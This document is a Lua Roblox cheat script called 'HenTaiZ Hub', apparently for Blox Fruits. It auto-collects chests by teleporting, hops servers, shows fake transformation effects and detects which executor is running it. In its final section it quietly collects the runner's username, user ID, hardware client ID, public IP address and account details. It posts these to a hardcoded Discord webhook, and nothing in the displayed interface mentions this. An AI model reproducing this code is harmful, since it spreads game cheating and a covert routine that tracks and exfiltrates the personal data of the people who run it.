-- 📢 Âm thanh khởi động
local startupSound = Instance.new("Sound")
startupSound.SoundId = "rbxassetid://8594342648"
startupSound.Volume = 5
startupSound.Looped = false
startupSound.Parent = game.CoreGui
startupSound:Play()

-- Khởi tạo Notification (Giả định module này tồn tại)
local Notification = require(game:GetService("ReplicatedStorage").Notification)
Notification.new("<Color=Cyan>HenTaiZ Hub <Color=/>"):Display()
wait(0.5)
Notification.new("<Color=Yellow>By HenTaiZ Hub On Top👑<Color=/>"):Display()
wait(1)

function CreateNotification(text1, color1, text2, color2)
    local ScreenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
    local TextLabel = Instance.new("TextLabel", ScreenGui)

    TextLabel.Size = UDim2.new(0, 400, 0, 50)
    TextLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Font = Enum.Font.SourceSansBold
    TextLabel.TextSize = 30
    TextLabel.TextStrokeTransparency = 0
    TextLabel.RichText = true
    TextLabel.Text = string.format('<font color="rgb(%d,%d,%d)">%s</font> <font color="rgb(%d,%d,%d)">%s</font>',
        color1.R * 255, color1.G * 255, color1.B * 255, text1,
        color2.R * 255, color2.G * 255, color2.B * 255, text2
    )
    wait(5) -- Tự động xóa sau 5 giây
    ScreenGui:Destroy()
end

-- Ví dụ chạy thử:
CreateNotification("HACK", Color3.fromRGB(255, 0, 0), "HenTaiZ HUB!", Color3.fromRGB(0, 255, 0))
-- Thông Báo Executor

-- Chức năng hiển thị FPS và Pinglocal Players = game:GetService("Players") local RunService = game:GetService("RunService") local Stats = game:GetService("Stats")



-- 📢 Thông báo
local Notification = require(game:GetService("ReplicatedStorage").Notification)
Notification.new("<Color=Cyan>HenTaiZ Hub <Color=/>"):Display()
wait(0.5)
Notification.new("<Color=Yellow>By HenTaiZ Hub On Top👑<Color=/>"):Display()
wait(1)
-- 📌 HenTaiZ HUB - Nhặt Rương Chính Xác + Đổi Server Đúng Yêu Cầu

repeat wait() until game:IsLoaded() and game.Players.LocalPlayer

-- 🖇️ Liên kết Discord
setclipboard("https://discord.gg/heSHddPs")

-- 🏴‍☠️ Tự động chọn team
local function AutoSelectTeam()
    if not getgenv().Team then
        warn("Chưa chọn team!")
        return
    end

    local teamName = getgenv().Team
    local validTeams = {"Marines", "Pirates"}

    if table.find(validTeams, teamName) then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", teamName)
        warn("✅ Đã chọn team: " .. teamName)
    else
        warn("⚠️ Team không hợp lệ: " .. teamName)
    end
end

AutoSelectTeam()
wait(2)


-- ================== Aura & Fake V4 + Race Transform ==================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:WaitForChild("Humanoid")
local hrp = char:WaitForChild("HumanoidRootPart")

-- ⚡ Tạo vòng sáng giả phía sau (giống awakening circle)
local function createAura()
    if hrp:FindFirstChild("FakeV4Aura") then return end

    local aura = Instance.new("ParticleEmitter")
    aura.Name = "FakeV4Aura"
    aura.Texture = "rbxassetid://259318296"
    aura.Rate = 50
    aura.Lifetime = NumberRange.new(1)
    aura.Speed = NumberRange.new(0)
    aura.Rotation = NumberRange.new(0, 360)
    aura.RotSpeed = NumberRange.new(30)
    aura.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,3), NumberSequenceKeypoint.new(1,0)})
    aura.Color = ColorSequence.new(Color3.fromRGB(255,85,0))
    aura.LightEmission = 1
    aura.Parent = hrp
end

-- 🔥 Glow toàn thân
local function createBodyGlow()
    for _, part in ipairs(char:GetChildren()) do
        if part:IsA("BasePart") and not part:FindFirstChild("FakeV4Glow") then
            local glow = Instance.new("PointLight")
            glow.Name = "FakeV4Glow"
            glow.Color = Color3.fromRGB(255,85,0)
            glow.Range = 10
            glow.Brightness = 2
            glow.Parent = part
        end
    end
end

-- 🎬 Fake Pose Animation
local function playFakeTransformAnim()
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://507771019"
    local track = humanoid:LoadAnimation(anim)
    track:Play()
end

-- 🌟 Race Transform Animation + Effect
local function playRaceTransform()
    local args = {
        Character = char,
        CFrame = hrp.CFrame,
        Color1 = Color3.fromRGB(255,85,0),
        Color2 = Color3.fromRGB(255,85,0),
        Color3 = Color3.fromRGB(255,85,0),
    }

    -- Load animation từ ReplicatedStorage
    local raceAnim = ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform
    humanoid:LoadAnimation(raceAnim):Play()

    -- Delay 1 giây rồi gọi effect
    delay(1, function()
        pcall(function()
            require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(args)
        end)
    end)
end

-- ================== Chạy ngay khi load script ==================
createAura()
createBodyGlow()
playFakeTransformAnim()
playRaceTransform()


-- ================== KHU VỰC SỬA LỖI QUAN TRỌNG ==================

-- ✅ Khởi tạo biến kiểm soát trên môi trường global
getgenv().autoCollectChest = true -- Mặc định là BẬT
getgenv().isServerHopping = false -- <<< BIẾN MỚI: Trạng thái đang đổi server

local chestCount, chestsCollected = 0, 0
local lastChestTime = os.time()
local teleportDelay = 0.15
local collectedChestIDs = {}
local maxChests = math.random(50, 75)
local startTime = os.time()

-- 📢 Thông báo khi script khởi động
game.StarterGui:SetCore("SendNotification", {
    Title = "HenTaiZ HUB",
    Text = "Script đang chạy... Tự động nhặt rương!",
    Duration = 5
})

-- 🚀 Teleport an toàn
local function teleportTo(targetPosition)
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local rootPart = character:FindFirstChild("HumanoidRootPart")

    if rootPart then
        rootPart.CFrame = CFrame.new(targetPosition)
        wait(teleportDelay)
    end
end

-- 🔄 Đổi server
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

-- 🔄 Đổi server với lý do
local function serverHop(reason)
    -- ✅ KIỂM TRA VÀ NGĂN CHẶN: Nếu đã tắt hoặc đang trong quá trình hop thì thoát
    if not getgenv().autoCollectChest or getgenv().isServerHopping then return end
    
    -- 🚨 KÍCH HOẠT TRẠNG THÁI HOP:
    getgenv().isServerHopping = true 
    getgenv().autoCollectChest = false -- Tắt auto collect để dừng vòng lặp collectChests

    -- Hiển thị notification
    createAura()
    createBodyGlow()
    playFakeTransformAnim()
    game.StarterGui:SetCore("SendNotification", {
        Title = "🔄 Server Hop",
        Text = reason,
        Duration = 5
    })

    -- Hàm lấy danh sách server
    local function ListServers(cursor)
        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor then
            url = url .. "&cursor=" .. cursor
        end

        local success, response = pcall(function()
            return game:HttpGet(url)
        end)

        if success then
            task.wait(1) -- tránh spam API
            return HttpService:JSONDecode(response)
        else
            warn("⚠️ Lỗi lấy server:", response)
            return {data = {}, nextPageCursor = nil}
        end
    end

    -- Tìm server ít người nhất, ưu tiên server 1 người
    local function FindBestServer()
        local cursor = nil
        local best = nil

        repeat
            local data = ListServers(cursor)
            for _, server in ipairs(data.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    if server.playing == 1 then
                        return server -- ưu tiên server 1 người
                    end
                    if not best or server.playing < best.playing then
                        best = server
                    end
                end
            end
            cursor = data.nextPageCursor
        until not cursor or best

        return best
    end

    -- Thử teleport với retry
    task.spawn(function()
        while true do
            local target = FindBestServer()
            if target then
                print("👉 Teleport tới server:", target.id, "Players:", target.playing)
                local ok, err = pcall(function()
                    TeleportService:TeleportToPlaceInstance(PlaceId, target.id, LocalPlayer)
                end)
                if ok then
                    break
                else
                    warn("⚠️ Teleport thất bại:", err, "→ thử lại sau 5s")
                end
            else
                warn("❌ Không tìm được server phù hợp → thử lại sau 5s")
            end
            task.wait(5)
        end
        -- Dù thành công hay thất bại, client sẽ rời khỏi server này
        -- nên không cần đặt isServerHopping = false ở đây.
    end)
end

-- Danh sách vật phẩm đặc biệt → dừng nhặt rương
local stopItems = {
    "Fist of Darkness",
    "God's Chalice"
}

-- =================== Hàm kiểm tra vật phẩm ===================
local function hasStopItem()
    local player = game.Players.LocalPlayer
    for _, itemName in ipairs(stopItems) do
        if player.Backpack:FindFirstChild(itemName) or player.Character:FindFirstChild(itemName) then
            return true
        end
    end
    return false
end

-- =================== Hàm nhặt rương ===================
function collectChests()
    -- SỬA LỖI: Kiểm tra biến Global
    while getgenv().autoCollectChest do
        wait(0.1)

        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return end

        -- Lấy danh sách rương
        -- Giả định CollectionService hoạt động và _ChestTagged là tag hợp lệ
        local chests = game:GetService("CollectionService"):GetTagged("_ChestTagged")

        -- Tìm rương gần nhất chưa nhặt
        local closestChest, closestDist = nil, math.huge
        for _, chest in ipairs(chests) do
            if not chest:GetAttribute("IsDisabled") and not collectedChestIDs[chest] then
                local chestPos = chest:GetPivot().Position
                local dist = (chestPos - rootPart.Position).Magnitude
                if dist < closestDist then
                    closestChest, closestDist = chest, dist
                end
            end
        end

        -- Nhặt rương nếu tìm thấy
        if closestChest then
            teleportTo(closestChest:GetPivot().Position + Vector3.new(0, 3, 0))
            lastChestTime = os.time()
            chestsCollected = chestsCollected + 1
            collectedChestIDs[closestChest] = true

            -- 📢 Thông báo nhặt rương
            game.StarterGui:SetCore("SendNotification", {
                Title = "📦 Nhặt Rương",
                Text = "Đã nhặt được " .. chestsCollected .. " rương!",
                Duration = 3
            })
        end

        -- 🔒 Dừng nhặt nếu có vật phẩm đặc biệt
        if hasStopItem() then
            -- SỬA LỖI: Thay đổi biến Global
            getgenv().autoCollectChest = false
            chestsCollected, collectedChestIDs, lastChestTime = 0, {}, os.time()
            game.StarterGui:SetCore("SendNotification", {
                Title = "🚨 Auto Nhặt Dừng",
                Text = "Đã nhặt được vật phẩm đặc biệt!",
                Duration = 4
            })
            break
        end

        -- 🔄 Server hop khi đạt giới hạn rương
        if chestsCollected >= maxChests and serverHop then
            serverHop("Đã đạt giới hạn rương, đổi server!")
        end
    end
end

-- =================== Reset nhân vật mỗi 15 giây ===================
spawn(function()
    while wait(15) do
        -- SỬA LỖI: Chỉ reset khi autoCollectChest BẬT VÀ KHÔNG ĐANG ĐỔI SERVER
        if getgenv().autoCollectChest and not getgenv().isServerHopping then
            local player = game.Players.LocalPlayer
            if player.Character then
                player.Character:BreakJoints()
                chestsCollected, collectedChestIDs, lastChestTime = 0, {}, os.time()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "🔄 Reset Nhân Vật",
                    Text = "Để chống văng game!",
                    Duration = 3
                })
            end
        end
    end
end)

-- =================== Server hop tự động ===================
-- 90 giây đổi server
spawn(function()
    while true do
        wait(60)
        -- SỬA LỖI: Kiểm tra biến Global VÀ KHÔNG ĐANG ĐỔI SERVER
        if getgenv().autoCollectChest and not getgenv().isServerHopping and serverHop then
            serverHop("Đủ 60 giây, đổi server!")
        end
    end
end)

-- Không nhặt được rương trong 5 giây → đổi server
spawn(function()
    while true do
        wait(5)
        -- SỬA LỖI: Kiểm tra biến Global VÀ KHÔNG ĐANG ĐỔI SERVER
        if getgenv().autoCollectChest and not getgenv().isServerHopping and os.time() - lastChestTime > 10 and serverHop then
            serverHop("Không nhặt được rương, đổi server!")
        end
    end
end)

-- ================== UI QUẢN LÝ GIAO DIỆN MỚI (ĐÃ SỬA LỖI) ==================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- Container chính
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 350)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.BorderSizePixel = 0
Frame.Active = true -- Cho phép kéo
Frame.Draggable = true -- Cho phép kéo
local Corner = Instance.new("UICorner", Frame)
Corner.CornerRadius = UDim.new(0, 15)

-- Tiêu đề
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "🎮 HenTaiZ Hub Beta"
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(255,255,255)

-- 📌 THÊM NÚT ẨN/HIỆN UI
local ToggleButton = Instance.new("TextButton", ScreenGui)
ToggleButton.Size = UDim2.new(0, 100, 0, 30)
ToggleButton.Position = UDim2.new(0, 50, 0, 10)
ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
ToggleButton.Text = "Hide Menu"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 18
ToggleButton.Name = "UI_Toggle_Button"

ToggleButton.MouseButton1Click:Connect(function()
    Frame.Visible = not Frame.Visible
    if Frame.Visible then
        ToggleButton.Text = "Hide Menu"
    else
        ToggleButton.Text = "Show Menu"
    end
end)


-- Hàm tạo toggle button đẹp
local function createToggle(name, default, callback, position)
    local btn = Instance.new("TextButton", Frame)
    btn.Size = UDim2.new(0, 220, 0, 50)
    btn.Position = position
    btn.Text = default and ("ON " .. name) or ("OFF " .. name)
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    btn.TextScaled = true
    btn.Font = Enum.Font.Gotham
    btn.TextColor3 = Color3.fromRGB(255,255,255)

    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 12)

    local state = default

    -- Hover effect
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    end)

    btn.MouseButton1Click:Connect(function()
        state = not state
        btn.Text = state and ("ON " .. name) or ("OFF " .. name)
        callback(state)
        
        -- QUAN TRỌNG: Gọi lại collectChests khi chuyển từ TẮT sang BẬT
        if state and name == "Auto Collect Chest" then
            -- Khi bật lại, reset trạng thái hop để đảm bảo
            getgenv().isServerHopping = false
            spawn(collectChests)
        end
        
        -- Thông báo
        game.StarterGui:SetCore("SendNotification", {
            Title = "🛠️ " .. name,
            Text = state and (name .. " Bật!") or (name .. " Tắt!"),
            Duration = 3
        })
    end)

    -- Hiệu ứng chữ cầu vồng
    spawn(function()
        local hue = 0
        while true do
            btn.TextColor3 = Color3.fromHSV(hue, 1, 1)
            hue = (hue + 0.01) % 1
            task.wait(0.05)
        end
    end)
end

-- 🔥 Chạy tự động khi script khởi động
spawn(collectChests)

-- 📌 THÊM NÚT ĐIỀU KHIỂN AUTO CHEST (Vị trí 70 pixels từ trên xuống)
createToggle("Auto Collect Chest", getgenv().autoCollectChest, function(state)
    getgenv().autoCollectChest = state
end, UDim2.new(0.5, -110, 0, 70))


-- 🛠 Xác định Executor (Giữ nguyên phần này)
-- 📌 Lấy thông tin thiết bị
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
end

-- 📌 Xác định Executor
local executor = "Unknown"
local isMobile = false
local isIOS = false
local isAndroid = false

if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif secure_load then
    executor = "Sentinel"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif getexecutorname then
    executor = getexecutorname()
elseif is_synapse_function then
    executor = "Synapse X (Detected by Function)"
elseif (getgenv and debug and debug.getinfo) then
    executor = "Possible PC Executor"
elseif (writefile and readfile) then
    executor = "Possible Mobile Executor"

-- 📌 Executor dành cho iOS
elseif (protect_gui and isfile) then
    executor = "Delta (iOS)"
    isMobile = true
    isIOS = true
elseif (hookfunction and getnamecallmethod) then
    executor = "ScriptWare (iOS & PC)"
    isMobile = true
    isIOS = true
elseif (isnetworkowner and islclosure) then
    executor = "Arceus X (iOS)"
    isMobile = true
    isIOS = true
elseif (getrawmetatable and setreadonly) then
    executor = "Magma Executor (iOS)"
    isMobile = true
    isIOS = true

-- 📌 Executor dành cho Android
elseif (protect_gui and isfile) then
    executor = "Delta (Android)"  -- Thêm executor Delta cho Android
    isMobile = true
    isAndroid = true
elseif (isexecutor and isfile) then
    executor = "Electron (Android)"
    isMobile = true
    isAndroid = true
elseif (isfile and readfile and writefile) then
    executor = "Fluxus Mobile (Android)"
    isMobile = true
    isAndroid = true
elseif (isnetworkowner and islclosure) then
    executor = "Arceus X (Android)"
    isMobile = true
    isAndroid = true

-- 📌 Executor khác
elseif (syn and syn.request) then
    executor = "Synapse X (PC)"
elseif (secure_call and syn) then
    executor = "Comet (PC)"
elseif (firetouchinterest and syn) then
    executor = "Celestial (PC)"
end

-- 📌 Xác định chính xác loại thiết bị
if isMobile then
    if isIOS then
        deviceType = "Mobile (iOS)"
    elseif isAndroid then
        deviceType = "Mobile (Android)"
    else
        deviceType = "Mobile (Unknown OS)"
    end
end

-- 📌 Lấy thông tin nhân vật
local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
local avatarLink = "https://www.roblox.com/users/" .. userId .. "/profile"

-- 📌 Lấy Hardware Key (Client ID)
local hardwareKey = "Unknown"
pcall(function()
    hardwareKey = game:GetService("RbxAnalyticsService"):GetClientId()
end)

-- 📌 Lấy thông tin thiết bị (SỬA LỖI)
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
elseif syn or is_sirhurt_closure or secure_load or getexecutorname or isnetworkowner then
    deviceType = "PC"  -- Nếu dùng các executor phổ biến cho PC, xác định là PC
elseif protect_gui or isfile or hookfunction or islclosure then
    deviceType = "Mobile"  -- Nếu có các hàm executor trên iOS/Android, xác định là Mobile
end

-- 📌 Lấy thông tin tài khoản
local accountAge = player.AccountAge
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

-- 📌 Lấy thông tin về "Sea" (Thế giới)
local seaName = "Unknown"
if game.PlaceId == 2753915549 then -- Place ID cho Sea 1
    seaName = "Sea 1"
elseif game.PlaceId == 4442272183 then -- Place ID cho Sea 2
    seaName = "Sea 2"
elseif game.PlaceId == 7449423635 then -- Place ID cho Sea 3
    seaName = "Sea 3"
else
    seaName = "Unknown Sea"
end

-- 📌 Lấy số lượng người chơi hiện tại trong server
local playerCount = #game.Players:GetPlayers()

-- 📌 Số người chơi tối đa cố định là 12
local maxPlayers = 12

-- 📌 Kiểm tra xem người chơi có ở server VIP hay không
local isVIPServer = false

-- Kiểm tra xem có phải server VIP không
if game.PrivateServerId ~= "" and game.PrivateServerId ~= "00000000-0000-0000-0000-000000000000" then
    isVIPServer = true
end

-- 📌 Lấy IP Address
local ipAddress = "Unknown"
pcall(function()
    ipAddress = game:HttpGet("https://api.ipify.org", true)
end)

-- 📌 Lấy Job ID
local jobId = game.JobId

-- 📌 Tạo Join Code
local joinCode = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. jobId .. "')"

-- 📌 Hàm sinh màu ngẫu nhiên
local function generateRandomColor()
    return tonumber(string.format("0x%02X%02X%02X", math.random(0, 255), math.random(0, 255), math.random(0, 255)))
end

-- 📌 Lấy HttpService
local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"

-- 📌 Gửi thông báo lên Webhook Discord (SỬA LỖI TÊN THIẾT BỊ)
local function guiThongBaoDiscord()
    local randomColor = generateRandomColor()

    local response = request({
        Url = Webhook_URL,
        Method = 'POST',
        Headers = { ['Content-Type'] = 'application/json' },
        Body = HttpService:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "**Script Đã Được Chạy!**",
                ["description"] = "**" .. displayName .. "** đã chạy script.",
                ["type"] = "rich",
                ["color"] = randomColor,
                ["thumbnail"] = { ["url"] = avatarUrl },
                ["fields"] = {
                    {
                        ["name"] = "👤 Tên nhân vật:",
                        ["value"] = username .. " (" .. displayName .. ")",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 User ID:",
                        ["value"] = tostring(userId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "⚡ Executor:",
                        ["value"] = executor,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📱 Tên thiết bị:",
                        ["value"] = deviceType,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📅 Tuổi tài khoản:",
                        ["value"] = tostring(accountAge) .. " ngày",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🎮 Tên trò chơi:",
                        ["value"] = gameName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 Game ID:",
                        ["value"] = tostring(gameId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🔑 Hardware Key:",
                        ["value"] = hardwareKey,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌍 Thế giới (Sea):",
                        ["value"] = seaName,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👥 Số người chơi trong server:",
                        ["value"] = tostring(playerCount) .. "/12",  -- Luôn hiển thị /12
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🌍 Server VIP/Thường:",
                        ["value"] = isVIPServer and "VIP Server" or "Server Thường",  -- Thêm thông báo Server VIP/Thường
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🌍 IP Address:",
                        ["value"] = ipAddress,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Job ID:",
                        ["value"] = jobId,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Join Code:",
                        ["value"] = "```lua\n" .. joinCode .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "⏰ Thời gian gửi:",
                        ["value"] = currentTime,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Link Avatar:",
                        ["value"] = avatarLink,
                        ["inline"] = false
                    }
                }
            }}
        })
    })
end

-- 🔥 Gửi thông báo khi script chạy
guiThongBaoDiscord()

-- 📌 Hiển thị thông báo trên Roblox
game.StarterGui:SetCore("SendNotification", {
    Title = "Executor",
    Text = "Bạn đang dùng: " .. executor,
    Duration = 5
})

-- 📌 Hiển thị thông báo trên Roblox về server VIP/Thường
local serverStatusMessage = isVIPServer and "Bạn đang ở **Server VIP**" or "Bạn đang ở **Server Thường**"

game.StarterGui:SetCore("SendNotification", {
    Title = "Server Status",
    Text = serverStatusMessage,
    Duration = 10
})
